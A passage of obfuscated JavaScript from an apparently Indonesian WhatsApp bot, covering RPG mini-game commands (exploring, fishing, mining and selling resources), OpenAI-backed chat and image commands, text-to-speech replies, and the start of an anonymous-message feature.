            if (_0x83eae5[_0x5804c8(0x977)] < 0x1) return _0x358f3b('Kirim perintah *' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x23a) + (_0x3b7c58 + _0x453fc1) + '* 10');
            jmlh = _0x1b04cf, rp = 0x19 * jmlh;
            if (getEmas(_0x1b1e88['sender']) < jmlh) return _0x358f3b('Emas Anda Tidak Cukup');
            sellEmas(_0x1b1e88[_0x5804c8(0xd13)], jmlh, balance), addBalance(_0x1b1e88['sender'], rp, balance), _0x358f3b(_0x5804c8(0x1f5) + _0x32b235 + '\x0a ┊ Buyer : Admin\x0a ┊ Harga/Emas : 25\x0a ┊ Status : Sukses\x0a ┊ Sisa Emas : ' + getEmas(_0x1b1e88[_0x5804c8(0xd13)]) + _0x5804c8(0x27b) + rp);
        }
        break;
        case _0x5804c8(0x58d): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            var _0x2bacbc = _0x83eae5['join'](' ');
            if (_0x2bacbc == _0x5804c8(0x8db)) {
                var _0x267aa3 = _0x5804c8(0x16d);
                setTimeout(async () => {
                    const _0x5ae770 = _0x5804c8,
                        _0x3e1a01 = Math['ceil'](Math[_0x5ae770(0xbbf)]() * 0x46),
                        _0x261f3d = Math[_0x5ae770(0x87e)](Math[_0x5ae770(0xbbf)]() * 0xf);
                    addStone(_0x1b1e88[_0x5ae770(0xd13)], _0x3e1a01), addIkan(_0x1b1e88[_0x5ae770(0xd13)], _0x261f3d), _0x614da8[_0x5ae770(0x938)](_0x1b1e88[_0x5ae770(0x60f)], {
                        'image': {
                            'url': _0x267aa3
                        },
                        'caption': _0x5ae770(0x138) + enter + enter + _0x5ae770(0x4c8) + _0x3e1a01 + _0x5ae770(0x759) + _0x261f3d + _0x5ae770(0x3ea) + enter + enter + _0x5ae770(0x2ff) + _0x3b7c58 + _0x5ae770(0x737)
                    }, {
                        'quoted': _0x1b1e88
                    });
                }, 0x7d0), setTimeout(() => {
                    const _0x4417e0 = _0x5804c8;
                    _0x358f3b(_0x4417e0(0xcb3));
                }, 0x0);
            } else {
                if (_0x2bacbc === _0x5804c8(0x149)) {
                    let _0x8f0568 = _0x5804c8(0x9b7);
                    setTimeout(async () => {
                        const _0x307088 = _0x5804c8,
                            _0x477f2d = Math[_0x307088(0x87e)](Math[_0x307088(0xbbf)]() * 0x6e),
                            _0x4fc2e7 = Math['ceil'](Math['random']() * 0x14);
                        addStone(_0x1b1e88['sender'], _0x477f2d), addKayu(_0x1b1e88['sender'], _0x4fc2e7), _0x614da8['sendMessage'](_0x1b1e88[_0x307088(0x60f)], {
                            'image': {
                                'url': _0x8f0568
                            },
                            'caption': _0x307088(0x138) + enter + enter + 'Kamu mendapatkan *' + _0x477f2d + _0x307088(0x759) + _0x4fc2e7 + '* kayu' + enter + enter + _0x307088(0x2ff) + _0x3b7c58 + _0x307088(0x737)
                        }, {
                            'quoted': _0x1b1e88
                        });
                    }, 0x7d0), setTimeout(() => {
                        const _0x1eb904 = _0x5804c8;
                        _0x358f3b(_0x1eb904(0xcb3));
                    }, 0x0);
                } else {
                    if (_0x2bacbc === _0x5804c8(0x2b7)) {
                        let _0x316f7d = _0x5804c8(0x514);
                        setTimeout(async () => {
                            const _0x2f01d9 = _0x5804c8,
                                _0x3aeee9 = Math[_0x2f01d9(0x87e)](Math['random']() * 0x41);
                            addIkan(_0x1b1e88[_0x2f01d9(0xd13)], _0x3aeee9), _0x614da8[_0x2f01d9(0x938)](_0x1b1e88[_0x2f01d9(0x60f)], {
                                'image': {
                                    'url': _0x316f7d
                                },
                                'caption': _0x2f01d9(0x138) + enter + enter + _0x2f01d9(0x4c8) + _0x3aeee9 + _0x2f01d9(0x3ea) + enter + enter + _0x2f01d9(0x2ff) + _0x3b7c58 + _0x2f01d9(0x737)
                            }, {
                                'quoted': _0x1b1e88
                            });
                        }, 0x7d0), setTimeout(() => {
                            const _0x5b22da = _0x5804c8;
                            _0x358f3b(_0x5b22da(0xcb3));
                        }, 0x0);
                    } else {
                        if (_0x2bacbc === _0x5804c8(0x9df)) {
                            let _0xc68bbf = _0x5804c8(0x865);
                            setTimeout(() => {
                                const _0x65e3b9 = _0x5804c8,
                                    _0x2a7413 = Math[_0x65e3b9(0x87e)](Math[_0x65e3b9(0xbbf)]() * 0x32),
                                    _0x432399 = Math['ceil'](Math[_0x65e3b9(0xbbf)]() * 0x50);
                                addOre(_0x1b1e88[_0x65e3b9(0xd13)], _0x2a7413), addStone(_0x1b1e88[_0x65e3b9(0xd13)], _0x432399), _0x614da8['sendMessage'](_0x1b1e88[_0x65e3b9(0x60f)], {
                                    'image': {
                                        'url': _0xc68bbf
                                    },
                                    'caption': _0x65e3b9(0x138) + enter + enter + _0x65e3b9(0x4c8) + _0x2a7413 + _0x65e3b9(0x157) + _0x432399 + _0x65e3b9(0x93e) + enter + enter + _0x65e3b9(0x2ff) + _0x3b7c58 + _0x65e3b9(0x737)
                                }, {
                                    'quoted': _0x1b1e88
                                });
                            }, 0x7d0), setTimeout(() => {
                                const _0x42cb40 = _0x5804c8;
                                _0x358f3b(_0x42cb40(0xcb3));
                            }, 0x0);
                        } else {
                            if (_0x2bacbc === 'chade mountain') {
                                let _0x192fa6 = _0x5804c8(0xc2a);
                                setTimeout(() => {
                                    const _0x29445e = _0x5804c8,
                                        _0x535c90 = Math['ceil'](Math[_0x29445e(0xbbf)]() * 0x28),
                                        _0x35f5e1 = Math['ceil'](Math[_0x29445e(0xbbf)]() * 0x3c);
                                    addOre(_0x1b1e88[_0x29445e(0xd13)], _0x535c90), addStone(_0x1b1e88[_0x29445e(0xd13)], _0x35f5e1), _0x614da8['sendMessage'](_0x1b1e88[_0x29445e(0x60f)], {
                                        'image': {
                                            'url': _0x192fa6
                                        },
                                        'caption': '*Congratulation 🎊*' + enter + enter + _0x29445e(0x4c8) + _0x535c90 + _0x29445e(0x157) + _0x35f5e1 + _0x29445e(0x93e) + enter + enter + _0x29445e(0x2ff) + _0x3b7c58 + _0x29445e(0x737)
                                    }, {
                                        'quoted': _0x1b1e88
                                    });
                                }, 0xbb8), setTimeout(() => {
                                    const _0x20aab4 = _0x5804c8;
                                    _0x358f3b(_0x20aab4(0xcb3));
                                }, 0x0);
                            } else {
                                if (_0x2bacbc === _0x5804c8(0x130)) {
                                    let _0x6368eb = _0x5804c8(0x426);
                                    setTimeout(async () => {
                                        const _0x4a72a0 = _0x5804c8,
                                            _0x4cae31 = Math[_0x4a72a0(0x87e)](Math[_0x4a72a0(0xbbf)]() * 0x5a),
                                            _0x2d7591 = Math[_0x4a72a0(0x87e)](Math[_0x4a72a0(0xbbf)]() * 0x2d);
                                        addStone(_0x1b1e88[_0x4a72a0(0xd13)], _0x4cae31), addKayu(_0x1b1e88['sender'], _0x2d7591), _0x614da8['sendMessage'](_0x1b1e88[_0x4a72a0(0x60f)], {
                                            'image': {
                                                'url': _0x6368eb
                                            },
                                            'caption': _0x4a72a0(0x138) + enter + enter + 'Kamu mendapatkan *' + _0x4cae31 + _0x4a72a0(0x759) + _0x2d7591 + _0x4a72a0(0x739) + enter + enter + _0x4a72a0(0x2ff) + _0x3b7c58 + _0x4a72a0(0x737)
                                        }, {
                                            'quoted': _0x1b1e88
                                        });
                                    }, 0x7d0), setTimeout(() => {
                                        const _0x52dec9 = _0x5804c8;
                                        _0x358f3b(_0x52dec9(0xcb3));
                                    }, 0x0);
                                } else {
                                    if (_0x2bacbc === _0x5804c8(0x9f0)) {
                                        let _0x34b39d = _0x5804c8(0x83c);
                                        setTimeout(() => {
                                            const _0x1597b0 = _0x5804c8,
                                                _0x45b38e = Math['ceil'](Math[_0x1597b0(0xbbf)]() * 0xc8),
                                                _0x466c26 = Math[_0x1597b0(0x87e)](Math[_0x1597b0(0xbbf)]() * 0x14);
                                            addStone(_0x1b1e88[_0x1597b0(0xd13)], _0x45b38e), addKayu(_0x1b1e88[_0x1597b0(0xd13)], _0x466c26), _0x614da8[_0x1597b0(0x938)](_0x1b1e88['chat'], {
                                                'image': {
                                                    'url': _0x34b39d
                                                },
                                                'caption': _0x1597b0(0x138) + enter + enter + 'Kamu mendapatkan *' + _0x45b38e + _0x1597b0(0x66e) + _0x466c26 + _0x1597b0(0x97c) + enter + enter + _0x1597b0(0x2ff) + _0x3b7c58 + _0x1597b0(0x737)
                                            }, {
                                                'quoted': _0x1b1e88
                                            });
                                        }, 0x7d0), setTimeout(() => {
                                            const _0x126762 = _0x5804c8;
                                            _0x358f3b(_0x126762(0xcb3));
                                        }, 0x0);
                                    } else {
                                        let _0xc4f1a0 = await getBuffer(_0x5804c8(0x7d8));
                                        tesk = '*PILIH WILAYAH YANG INGIN KAMU JELAJAHI*\x0a\x0a\x0a⚪ Corbiens River\x0a🔵 Cochher Sea\x0a⚫ Moobiens Grassland\x0a🟣 Gerbil Woods\x0a🟢 Chiltawa Woods\x0a🟠 Limingstall Mountains\x0a🔴 Chade Mountain\x0a\x0aExample :\x0a- ' + _0x3b7c58 + _0x5804c8(0x923), _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                                            'image': _0xc4f1a0,
                                            'caption': tesk
                                        }, {
                                            'quoted': _0x1b1e88
                                        });
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        break;
        case 'mancing': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x53a93f) return _0x358f3b('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg');
            setTimeout(() => {
                const _0x3dbf8e = _0x5804c8,
                    _0x3bce2d = Math[_0x3dbf8e(0x87e)](Math[_0x3dbf8e(0xbbf)]() * 0xa);
                addIkan(_0x1b1e88[_0x3dbf8e(0xd13)], _0x3bce2d), _0x358f3b(_0x3dbf8e(0x9b5) + _0x3bce2d + _0x3dbf8e(0x1d2));
            }, 0x1770), setTimeout(() => {
                const _0xf18430 = _0x5804c8;
                _0x358f3b(_0xf18430(0x292));
            }, 0xfa0), setTimeout(() => {
                _0x358f3b('🎣 Menarik Kail. . .');
            }, 0xbb8), setTimeout(() => {
                _0x358f3b('🎣 Mulai Memancing . . .');
            }, 0x0);
        }
        break;
        case 'jualikan': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x53a93f) return _0x358f3b(_0x5804c8(0x372));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xb53) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x33e) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x1c4));
            bayar = _0x83eae5[_0x5804c8(0xc6c)](' ');
            const _0x496cae = 0x2710,
                _0x41632b = bayar * _0x496cae;
            if (getMancingIkan(_0x1b1e88[_0x5804c8(0xd13)]) <= 0x1) return _0x358f3b(_0x5804c8(0xd19) + _0x32b235 + _0x5804c8(0x5d0));
            getMancingIkan(_0x1b1e88[_0x5804c8(0xd13)]) >= 0x1 && (jualIkan(_0x1b1e88[_0x5804c8(0xd13)], bayar), addKoinUser(_0x1b1e88[_0x5804c8(0xd13)], _0x41632b), await _0x358f3b(_0x5804c8(0x5e8) + enter + enter + _0x5804c8(0x461) + bayar + enter + '*Uang didapat:* ' + _0x41632b + enter + enter + _0x5804c8(0x356) + getMancingIkan(_0x1b1e88[_0x5804c8(0xd13)]) + enter + _0x5804c8(0x5a8) + checkATMuser(_0x1b1e88['sender'])));
        }
        break;
        case 'jualcoal': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x53a93f) return _0x358f3b(_0x5804c8(0x372));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xb53) + (_0x3b7c58 + _0x453fc1) + ' jumlah yg ingin di jual\x0a\x0aContoh ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x1c4));
            bayar = _0x83eae5['join'](' ');
            const _0x917151 = 0x3a98,
                _0x1f91ab = bayar * _0x917151;
            if (getMiningcoal(_0x1b1e88[_0x5804c8(0xd13)]) <= 0x1) return _0x358f3b('Maaf ' + _0x32b235 + ' kamu tidak punya coal');
            getMiningcoal(_0x1b1e88['sender']) >= 0x1 && (jualcoal(_0x1b1e88['sender'], bayar), addKoinUser(_0x1b1e88[_0x5804c8(0xd13)], _0x1f91ab), await _0x358f3b('*「 PENJUALAN BERHASIL 」*' + enter + enter + _0x5804c8(0xa4d) + bayar + enter + '*Uang didapat:* ' + _0x1f91ab + enter + enter + _0x5804c8(0x5eb) + getMiningcoal(_0x1b1e88[_0x5804c8(0xd13)]) + enter + _0x5804c8(0x5a8) + checkATMuser(_0x1b1e88[_0x5804c8(0xd13)])));
        }
        break;
        case _0x5804c8(0xbfc): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x53a93f) return _0x358f3b(_0x5804c8(0x372));
            if (!_0x1b04cf) return _0x358f3b('Kirim perintah ' + (_0x3b7c58 + _0x453fc1) + ' jumlah yg ingin di jual\x0a\x0aContoh ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x1c4));
            bayar = _0x83eae5[_0x5804c8(0xc6c)](' ');
            const _0x363bb8 = 0x2,
                _0x4fc7c4 = bayar * _0x363bb8;
            if (getMiningore(_0x1b1e88['sender']) <= 0x1) return _0x358f3b(_0x5804c8(0xd19) + _0x32b235 + _0x5804c8(0x809));
            getMiningore(_0x1b1e88['sender']) >= 0x1 && (jualore(_0x1b1e88[_0x5804c8(0xd13)], bayar), addIngot(_0x1b1e88['sender'], _0x4fc7c4), await _0x358f3b(_0x5804c8(0x785) + bayar + _0x5804c8(0x562) + _0x4fc7c4 + _0x5804c8(0x199) + getMiningore(_0x1b1e88[_0x5804c8(0xd13)])));
        }
        break;
        case _0x5804c8(0x5ba): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x53a93f) return _0x358f3b(_0x5804c8(0x372));
            if (!_0x1b04cf) return _0x358f3b('Kirim perintah ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x33e) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x1c4));
            bayar = _0x83eae5[_0x5804c8(0xc6c)](' ');
            const _0x4e3632 = 0x384,
                _0x534524 = bayar * _0x4e3632;
            if (getMiningstone(_0x1b1e88['sender']) <= 0x1) return _0x358f3b(_0x5804c8(0xd19) + _0x32b235 + _0x5804c8(0x50e));
            getMiningstone(_0x1b1e88['sender']) >= 0x1 && (jualstone(_0x1b1e88[_0x5804c8(0xd13)], bayar), addKoinUser(_0x1b1e88[_0x5804c8(0xd13)], _0x534524), await _0x358f3b(_0x5804c8(0x5e8) + enter + enter + _0x5804c8(0xc38) + bayar + enter + '*Uang didapat:* ' + _0x534524 + enter + enter + _0x5804c8(0xd8f) + getMiningstone(_0x1b1e88[_0x5804c8(0xd13)]) + enter + _0x5804c8(0x5a8) + checkATMuser(_0x1b1e88['sender'])));
        }
        break;
        case 'jualingot': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x53a93f) return _0x358f3b(_0x5804c8(0x372));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xb53) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x33e) + (_0x3b7c58 + _0x453fc1) + ' 10');
            bayar = _0x83eae5[_0x5804c8(0xc6c)](' ');
            const _0x16ae55 = 0x88b8,
                _0x51ba39 = bayar * _0x16ae55;
            if (getMiningingot(_0x1b1e88[_0x5804c8(0xd13)]) <= 0x1) return _0x358f3b(_0x5804c8(0xd19) + _0x32b235 + _0x5804c8(0x2fa));
            getMiningingot(_0x1b1e88['sender']) >= 0x1 && (jualingot(_0x1b1e88[_0x5804c8(0xd13)], bayar), addKoinUser(_0x1b1e88[_0x5804c8(0xd13)], _0x51ba39), await _0x358f3b(_0x5804c8(0x5e8) + enter + enter + '*Jumlah Ingot dijual:* ' + bayar + enter + _0x5804c8(0x8b5) + _0x51ba39 + enter + enter + _0x5804c8(0x1d6) + getMiningingot(_0x1b1e88['sender']) + enter + _0x5804c8(0x5a8) + checkATMuser(_0x1b1e88[_0x5804c8(0xd13)])));
        }
        break;
        case _0x5804c8(0x662): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x53a93f) return _0x358f3b(_0x5804c8(0x372));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xb53) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x33e) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x1c4));
            bayar = _0x83eae5[_0x5804c8(0xc6c)](' ');
            const _0x7c9c38 = 0x4650,
                _0x36ce89 = bayar * _0x7c9c38;
            if (getNebangKayu(_0x1b1e88[_0x5804c8(0xd13)]) <= 0x1) return _0x358f3b('Maaf ' + _0x32b235 + ' kayu kamu belum cukup, minimal 2 kayu');
            getNebangKayu(_0x1b1e88[_0x5804c8(0xd13)]) >= 0x1 && (jualkayu(_0x1b1e88['sender'], bayar), addKoinUser(_0x1b1e88[_0x5804c8(0xd13)], _0x36ce89), await _0x358f3b(_0x5804c8(0x5e8) + enter + enter + '*Jumlah Kayu dijual:* ' + bayar + enter + _0x5804c8(0x8b5) + _0x36ce89 + enter + enter + '*Sisa Kayu :* ' + await getNebangKayu(_0x1b1e88['sender']) + enter + _0x5804c8(0x5a8) + await checkATMuser(_0x1b1e88[_0x5804c8(0xd13)])));
        }
        break;
        case 'nebang': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            setTimeout(() => {
                const _0x4d2393 = _0x5804c8,
                    _0x2ff612 = Math['ceil'](Math[_0x4d2393(0xbbf)]() * 0x14);
                addKayu(_0x1b1e88[_0x4d2393(0xd13)], _0x2ff612), _0x358f3b('*Congratulation 🎊*' + enter + enter + _0x4d2393(0x53a) + _0x2ff612 + _0x4d2393(0x475));
            }, 0x7d0), setTimeout(() => {
                const _0x21aca5 = _0x5804c8;
                _0x358f3b(_0x21aca5(0x5e9));
            }, 0x0);
        }
        break;
        case _0x5804c8(0x747): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            setTimeout(() => {
                const _0x3e7948 = _0x5804c8,
                    _0x328bdf = Math['ceil'](Math['random']() * 0x64),
                    _0x27d016 = [_0x3e7948(0x976), 'venus', _0x3e7948(0x8a3), _0x3e7948(0x145), _0x3e7948(0x3bf), 'neptunus', _0x3e7948(0xd62)],
                    _0x361cf2 = _0x27d016[Math[_0x3e7948(0xa2b)](Math[_0x3e7948(0xbbf)]() * _0x27d016[_0x3e7948(0x977)])];
                addPlanet(_0x1b1e88['sender'], _0x328bdf), _0x358f3b(_0x3e7948(0x138) + enter + enter + _0x3e7948(0x53a) + _0x328bdf + _0x3e7948(0xae6) + _0x361cf2 + _0x3e7948(0x754));
            }, 0x7d0), setTimeout(() => {
                const _0x5dbd95 = _0x5804c8;
                _0x358f3b(_0x5dbd95(0x89f));
            }, 0x0);
        }
        break;
        case 'jualbahankimia': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b1e88['isGroup']) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x53a93f) return _0x358f3b('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg');
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xb53) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x33e) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x1c4));
            buayar = _0x83eae5['join'](' ');
            const _0x31b334 = 0x3e8,
                _0x3bb3d9 = buayar * _0x31b334;
            if (getBertualangPlanet(_0x1b1e88[_0x5804c8(0xd13)]) <= 0x1) return _0x358f3b(_0x5804c8(0xa4c) + _0x32b235 + _0x5804c8(0x500));
            getBertualangPlanet(_0x1b1e88['sender']) >= 0x1 && (jualbahankimia(_0x1b1e88[_0x5804c8(0xd13)], buayar), addKoinUser(_0x1b1e88['sender'], _0x3bb3d9), await _0x358f3b(_0x5804c8(0x5e8) + enter + enter + _0x5804c8(0x5f8) + buayar + enter + _0x5804c8(0x8b5) + _0x3bb3d9 + enter + enter + _0x5804c8(0x7a9) + getBertualangPlanet(_0x1b1e88['sender']) + enter + _0x5804c8(0x5a8) + checkATMuser(_0x1b1e88[_0x5804c8(0xd13)]) + enter + enter));
        }
        break;
        case _0x5804c8(0x946): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b('Kirim perintah:\x0a' + (_0x3b7c58 + _0x453fc1) + ' query\x0a\x0aContoh penggunaan:\x0a' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x441));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            try {
                const _0x47425f = new Configuration({
                        'apiKey': _0x932571[_0x5804c8(0x4a5)]
                    }),
                    _0x1df272 = new OpenAIApi(_0x47425f),
                    _0x471948 = await _0x1df272[_0x5804c8(0xb3f)]({
                        'model': 'gpt-3.5-turbo',
                        'messages': [{
                            'role': _0x5804c8(0x610),
                            'content': _0x1b04cf
                        }]
                    });
                _0x358f3b(_0x471948[_0x5804c8(0x233)][_0x5804c8(0x1a9)][0x0][_0x5804c8(0x200)][_0x5804c8(0xb1a)] + '\x0a\x0a');
            } catch (_0x465edb) {
                _0x358f3b(_0x5804c8(0x617));
            }
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case 'aidraw':
        case 'aidrawing':
        case 'image':
        case 'img':
        case _0x5804c8(0xaad):
        case _0x5804c8(0xcb5):
        case _0x5804c8(0xd1a): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x710) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x2ad) + (_0x3b7c58 + _0x453fc1) + ' kabbah');
            _0x358f3b(mess[_0x5804c8(0x135)]);
            try {
                const _0x3a0ca9 = new Configuration({
                        'apiKey': _0x932571[_0x5804c8(0x4a5)]
                    }),
                    _0xe6d5a0 = new OpenAIApi(_0x3a0ca9),
                    _0x48d553 = await _0xe6d5a0[_0x5804c8(0xc45)]({
                        'prompt': _0x1b04cf,
                        'n': 0x1,
                        'size': _0x5804c8(0x9a5)
                    });
                _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                    'image': {
                        'url': _0x48d553[_0x5804c8(0x233)]['data'][0x0][_0x5804c8(0xbf3)]
                    },
                    'caption': ''
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x56e08d) {
                _0x358f3b(_0x56e08d[_0x5804c8(0x200)]);
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0xbc7):
        case _0x5804c8(0x9c6): {
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!q) return _0x358f3b(_0x5804c8(0x234));
            let _0x417557 = _0x614da8['getName'](_0x1b1e88['sender']);
            await _0x614da8[_0x5804c8(0x593)](_0x5804c8(0x9fb), _0x1b1e88[_0x5804c8(0x60f)]);
            let _0x31a1af = await fetchJson('https://skizo.tech/api/openai?text=' + q + '&apikey=' + _0x932571[_0x5804c8(0x342)]);
            const _0x5525dd = _0x31a1af[_0x5804c8(0x6b2)];
            _0x1c7aed('#say', _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            var _0x47b319 = _0x5525dd[_0x5804c8(0x4bd)]('--')[0x1];
            if (!_0x47b319) _0x47b319 = 'id';
            long = 'id';

            function _0x282a92(_0x24f289, _0x1c67d1 = 'id') {
                return new Promise((_0x30f865, _0x5e1bee) => {
                    const _0x51edd7 = _0x2dbd;
                    try {
                        let _0x460680 = gtts(_0x1c67d1),
                            _0x337509 = path['join'](__dirname, _0x51edd7(0x5e7), 0x1 * new Date() + _0x51edd7(0xd23));
                        _0x460680[_0x51edd7(0x753)](_0x337509, _0x24f289, () => {
                            const _0x30edb4 = _0x51edd7;
                            _0x30f865(fs[_0x30edb4(0x456)](_0x337509)), fs[_0x30edb4(0x850)](_0x337509);
                        });
                    } catch (_0x6e3712) {
                        _0x5e1bee(_0x6e3712);
                    }
                });
            }
            let _0x3a2d30;
            try {
                _0x3a2d30 = await _0x282a92(_0x5525dd, long);
            } catch (_0x52a751) {
                _0x358f3b(_0x52a751 + ''), _0x3a2d30 = await _0x282a92(_0x5525dd);
            } finally {
                _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'audio': _0x3a2d30,
                    'mimetype': _0x5804c8(0x8d4),
                    'ptt': !![]
                }, {
                    'quoted': _0x1b1e88
                });
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'ai':
        case _0x5804c8(0x97a):
            try {
                if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
                if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
                if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xc33) + _0x3b7c58 + _0x453fc1 + _0x5804c8(0x310));
                let _0x2a550a = await fetchJson(_0x5804c8(0x7a4) + _0x1b04cf + _0x5804c8(0xcc7) + _0x932571['XznKey']);
                const _0x127058 = _0x2a550a[_0x5804c8(0x6b2)];
                _0x358f3b('' + _0x127058);
            } catch (_0x1ece44) {
                console[_0x5804c8(0xcd3)](_0x1ece44), _0x358f3b(_0x5804c8(0xaf5));
            }
            limitAdd(_0x1b1e88['sender'], limit);
            break;
        case 'ai2':
        case _0x5804c8(0x306):
            try {
                if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
                if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
                if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xc33) + _0x3b7c58 + _0x453fc1 + ' Apa itu chatgpt');
                let _0x711dcc = await fetchJson(_0x5804c8(0xcf9) + _0x1b04cf + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0x342)]);
                const _0x2c28b5 = _0x711dcc[_0x5804c8(0xb1a)];
                _0x358f3b('' + _0x2c28b5);
            } catch (_0x32eca8) {
                console['log'](_0x32eca8), _0x358f3b(_0x5804c8(0xaf5));
            }
            limitAdd(_0x1b1e88['sender'], limit);
            break;
        case _0x5804c8(0x671):
        case 'menfes':
        case _0x5804c8(0x592): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            this[_0x5804c8(0x989)] = this['menfes'] ? this[_0x5804c8(0x989)] : {}, roof = Object[_0x5804c8(0x960)](this[_0x5804c8(0x989)])[_0x5804c8(0x958)](_0x5edf53 => [_0x5edf53['a'], _0x5edf53['b']][_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0xd13)]));
            if (roof) return _0x358f3b(_0x5804c8(0x3e6));
            if (_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x682));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x1bf) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xbb5) + (_0x3b7c58 + _0x453fc1) + ' ' + _0x32b235 + _0x5804c8(0xd5a));
            if (!_0x1b04cf[_0x5804c8(0x34b)]('|')) return _0x358f3b(_0x5804c8(0x1bf) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xbb5) + (_0x3b7c58 + _0x453fc1) + ' ' + _0x32b235 + _0x5804c8(0x8f4));
            let [_0x2f5f94, _0x5d0892, _0x2b9ee2] = _0x1b04cf[_0x5804c8(0x4bd)]
            `|`;
            if (_0x5d0892[_0x5804c8(0xac2)]('0')) return _0x358f3b(_0x5804c8(0x1bf) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xbb5) + (_0x3b7c58 + _0x453fc1) + ' ' + _0x32b235 + '|628xxx|Menfes nih\x0a');
            if (isNaN(_0x5d0892)) return _0x358f3b(_0x5804c8(0x1bf) + (_0x3b7c58 + _0x453fc1) + ' nama|nomor|pesan\x0a\x0aContoh :\x0a' + (_0x3b7c58 + _0x453fc1) + ' ' + _0x32b235 + _0x5804c8(0xd5a));
